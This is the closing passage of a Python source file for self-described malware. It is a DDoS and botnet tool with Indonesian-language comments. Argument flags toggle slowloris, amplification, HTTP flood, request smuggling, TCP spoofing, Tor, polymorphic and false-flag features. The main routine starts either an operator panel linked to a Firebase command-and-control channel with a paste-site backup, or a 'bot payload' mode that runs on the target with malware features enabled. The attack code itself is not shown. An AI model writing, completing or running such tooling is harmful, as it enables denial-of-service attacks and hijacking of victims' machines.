        elif a == "--no-timing": config.enable_human_timing = False; i += 1
        elif a == "--no-tcp-spoof": config.enable_tcp_spoof = False; i += 1
        elif a == "--no-doh": config.enable_doh = False; i += 1
        elif a == "--no-tor": config.enable_tor = False; i += 1
        elif a == "--no-false-flag": config.enable_false_flag = False; i += 1
        elif a == "--no-polymorphic": config.enable_polymorphic = False; i += 1
        elif a == "--no-amp": config.enable_amp = False; i += 1
        elif a == "--no-slowloris": config.enable_slowloris = False; i += 1
        elif a == "--no-graphql": config.enable_graphql = False; i += 1
        elif a == "--no-brotli": config.enable_brotli = False; i += 1
        elif a == "--no-smuggling": config.enable_smuggling = False; i += 1
        elif a == "--no-websocket": config.enable_websocket = False; i += 1
        elif a == "--no-http-flood": config.enable_http_flood = False; i += 1
        else: i += 1
    
    return config


# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

async def main():
    config = parse_args()
    print_banner()
    
    if config.mode == "operator":
        print("[+] Mode: OPERATOR (AMAN - gak ada self-infection)")
        print("[+] Semua malware features DISABLED di komputer lo")
        print("[+] Ketik 'help' buat lihat command list")
        print("[+] Ketik 'setup' buat lihat setup guide\n")
        
        # Init C2 untuk operator (opsional)
        panel = OperatorPanel(config)
        if config.c2_firebase_url and config.enable_c2:
            panel.c2 = FirebaseC2(
                db_url=config.c2_firebase_url,
                db_secret=config.c2_firebase_secret,
                password=config.c2_password or None,
                backup_url=config.c2_backup_paste or None,
            )
            await panel.c2.start()
            print(f"[+] C2 Connected: {panel.c2.bot_id}")
        
        await panel.run()
        
        if panel.c2: await panel.c2.stop()
    
    elif config.mode == "bot":
        print("[+] Mode: BOT PAYLOAD (jalan di target)")
        print("[+] Malware features: ENABLED")
        
        bot = BotPayload(config)
        await bot.run()

if __name__ == "__main__":
    asyncio.run(main())
